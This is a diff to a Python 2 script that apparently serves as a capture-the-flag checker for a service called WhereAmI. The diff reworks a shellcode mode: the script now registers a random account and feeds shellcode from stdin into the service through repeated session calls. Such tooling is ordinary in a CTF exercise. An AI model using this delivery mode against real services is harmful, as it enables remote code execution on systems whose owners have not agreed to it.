@@ -151,16 +151,24 @@ def check(host, port, name, flag):
         print 'Exception:', e
     return res
 
-def put_shellcode(host, port, name, password):
+def random_string(l):
+    s = ''
+    alpha = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
+    while len(s) < l:
+        s += alpha[int(random.random() * len(alpha))];
+    return s
+
+def put_shellcode(host, port):
+    name = random_string(14)
+    password = random_string(14)
     res = 1
     if not os.isatty(0):
         shellcode = sys.stdin.read()
         try:
             con = socket.create_connection((host, port))
             w = WhereAmI(con)
-            if not w.log_in(name, password):
-                if w.create_user(name, password):
-                    w.log_in(name, password)
+            if w.create_user(name, password):
+                w.log_in(name, password)
 
             for c in shellcode:
                 w.play_session()
@@ -175,7 +183,7 @@ def help(s):
     print('Usage:')
     print('  %s -p <host> <port> <name> <flag>' % s)
     print('  %s -c <host> <port> <name> <flag>' % s)
-    print('  echo "shellcode" | %s -s <host> <port> <name> <password>' % s)
+    print('  echo "shellcode" | %s -s <host> <port>' % s)
 
 def main(args):
     val = 1
@@ -184,8 +192,8 @@ def main(args):
             val = plant(args[2], int(args[3]), args[4], args[5])
         elif (args[1] == '-c' or args[1] == '--check') and len(args) >= 6:
             val = check(args[2], int(args[3]), args[4], args[5])
-        elif (args[1] == '-s' or args[1] == '--shellcode') and len(args) >= 6:
-            val = put_shellcode(args[2], int(args[3]), args[4], args[5])
+        elif (args[1] == '-s' or args[1] == '--shellcode') and len(args) >= 4:
+            val = put_shellcode(args[2], int(args[3]))
         else:
             help(args[0])
     else:
